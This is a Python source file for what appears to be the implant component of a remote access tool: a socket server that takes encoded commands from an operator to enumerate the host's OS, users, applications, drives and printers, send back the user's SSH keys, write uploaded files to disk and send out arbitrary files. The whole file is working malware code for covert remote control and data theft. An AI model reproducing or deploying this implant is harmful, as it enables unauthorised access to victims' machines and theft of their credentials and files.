import logging
import os
import platform
import SocketServer

from crypto.mime import Mime
from constants import BUFFER_SIZE, PLATFORMS, EOF_STR

logging.basicConfig(level=logging.DEBUG, format='%(name)s: %(message)s')

class ImplantHandler(SocketServer.BaseRequestHandler):
    def __init__(self, request, client_address, server):
        self.logger = logging.getLogger('ImplantHandler')
        self.logger.debug('__init__')
        self.cipher = Mime()
        self.platform = PLATFORMS[platform.system()]
        SocketServer.BaseRequestHandler.__init__(self, request, client_address, server)
        return
    
    def setup(self):
        self.logger.debug('setup')
        return SocketServer.BaseRequestHandler.setup(self)
    
    def handle(self):
        self.logger.debug('handle')
        
        while True:
            try:
                self.logger.debug("waiting for cmd")
                cmd = self.cipher.decode(self.request.recv(BUFFER_SIZE)).strip()
                self.logger.debug("received cmd-->" + cmd)

                if cmd == "enum_os":
                    self.request.sendall(self.cipher.encode(self.platform.enum_os())) 
                elif cmd == "enum_users":
                    self.request.sendall(self.cipher.encode(self.platform.enum_users()))
                elif cmd == "enum_applications":
                    self.request.sendall(self.cipher.encode(self.platform.enum_applications()))
                elif cmd == "enum_drives":
                    self.request.sendall(self.cipher.encode(self.platform.enum_drives()))
                elif cmd == "enum_printers":
                    self.request.sendall(self.cipher.encode(self.platform.enum_printers()))
                elif cmd == "get_ssh_keys":
                    self.request.sendall(self.cipher.encode(self.platform.get_ssh_keys()))
                elif cmd.startswith('upload') == True:
                    saveMeFile = cmd[7:].split(' ')[1]
                    self.logger.debug("receiving file")
                    
                    if os.path.isfile(saveMeFile):
                        break 
                    else:  
                        with open(saveMeFile, 'wb') as f:
                            self.logger.debug("reading file")
                            while True: 
                                data = self.cipher.decode(self.request.recv(BUFFER_SIZE))
                                                                
                                if not data: #error... receiving NULL instead of EOF_STR
                                    break
                                elif EOF_STR in data: 
                                    self.logger.debug("read EOF msg from wire")
                                    f.write(data[:-8])
                                    break
                                else:
                                    self.logger.debug("writing data to file")
                                    f.write(data)
                        self.logger.debug("saved file")            
                elif cmd.startswith('download') == True:
                    sendMeFile = cmd[9:].split(' ')[0]
                    self.logger.debug("starting upload")
                    
                    with open(sendMeFile, 'rb') as f:
                        self.logger.debug("reading file")
                        while True:
                            data = f.read(BUFFER_SIZE)
 
                            if not data:
                                self.request.sendall(self.cipher.encode(EOF_STR))
                                break
                            else:
                                self.request.sendall(self.cipher.encode(data)) 
                    self.logger.debug("sent file")
                elif cmd == "exit":
                    break
                else:
                    self.request.sendall(self.cipher.encode("[!] Unknown command\n"))
            except Exception as e:
                self.logger.debug(e)
                break
        return
    
    def finish(self):
        self.logger.debug('finish')
        return SocketServer.BaseRequestHandler.finish(self)                          